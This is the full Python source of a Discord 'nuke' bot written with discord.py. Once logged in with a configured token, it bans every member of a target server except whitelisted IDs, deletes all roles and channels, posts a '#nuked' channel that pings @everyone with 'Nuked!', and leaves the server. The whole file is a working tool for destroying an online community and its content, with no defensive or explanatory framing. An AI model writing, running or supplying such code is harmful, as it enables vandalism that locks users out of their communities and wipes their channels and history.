# Imports
import asyncio
import json
import logging
import logging.config
import platform
import sys
import discord
from discord.ext import commands
from dotenv import dotenv_values


# Windows Setup
if platform.system() == "Windows":
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())


# Logging
open("funbot.log", "w+").close()
logging.config.dictConfig(
    {
        "version": 1,
        "disable_existing_loggers": True,
    }
)
format = "%(asctime)s, [%(levelname)s] %(message)s"
logging.basicConfig(
    filename="funbot.log", encoding="utf-8", format=format, level=logging.DEBUG
)
console = logging.StreamHandler()
console.setLevel(logging.DEBUG)
console.setFormatter(logging.Formatter(format))
logging.getLogger().addHandler(console)


# Variables
env = dotenv_values("config.env")
if not env["BOT_TOKEN"] or not env["GUILD_ID"]:
    logging.error("Please properly configure the bot")
    logging.info("Exiting with code 1")
    sys.exit(1)
if not env["AUDIT_MSG"]:
    env["AUDIT_MSG"] = "Nuked!"
audit_msg = env["AUDIT_MSG"]
whitelist = json.loads(env["WHITELIST"])


# Main Bot
bot = commands.Bot(command_prefix="f!", intents=discord.Intents.all())

@bot.event
async def on_ready():
    try:
        guild = await bot.fetch_guild(int(env["GUILD_ID"]))
    except Exception:
        logging.error("Failed to fetch guild")
        logging.info("Exiting with code 1")
        await bot.close()
        sys.exit(1)
    logging.info(f"Bot is {bot.user.name}#{bot.user.discriminator} (ID {bot.user.id})")
    logging.info("Waiting 5 seconds...")
    await asyncio.sleep(5)
    logging.info(f"Starting nuke on {guild.name}")

    logging.debug("Attempting to ban all members")
    async for member in guild.fetch_members():
        member_full = f"{member.name}#{member.discriminator} (ID {member.id})"
        if member.id in whitelist:
            logging.debug(f"Skipping whitelisted user {member_full}")
            continue
        try:
            await member.ban(reason=audit_msg)
            logging.debug(f"Successfully banned member {member_full}")
        except Exception:
            logging.error(f"Unable to ban member {member_full}")
    logging.info("Finished banning all members")

    logging.debug("Attempting to delete all roles")
    for role in guild.roles:
        role_full = f"{role.name} (ID {role.id})"
        try:
            await role.delete(reason=audit_msg)
            logging.debug(f"Successfully deleted role {role_full}")
        except Exception:
            logging.error(f"Unable to delete role {role_full}")
    logging.info("Finished deleting all roles")

    logging.debug("Attempting to delete all channels")
    for channel in await guild.fetch_channels():
        channel_full = f"{channel.name} (ID {channel.id})"
        try:
            await channel.delete(reason=audit_msg)
            logging.debug(f"Successfully deleted channel {channel_full}")
        except Exception:
            logging.error(f"Unable to delete channel {channel_full}")
    logging.info("Finished deleting all channels")

    logging.debug("Attempting to send nuke notification to guild")
    try:
        channel = await guild.create_text_channel("nuked", reason=audit_msg)
        logging.debug("Created channel #nuked")
        await channel.send(f"@everyone {audit_msg}")
        logging.info("Finished sending nuke notification to guild")
    except Exception:
        logging.error("Unable to send nuke notification to guild")

    logging.info("Nuke complete")
    logging.info("Leaving guild before exiting")
    try:
        await guild.leave()
    except Exception:
        logging.error("Unable to leave guild")
    logging.info("Exiting with code 0")
    await bot.close()
    sys.exit()


# Login
bot.run(env["BOT_TOKEN"])
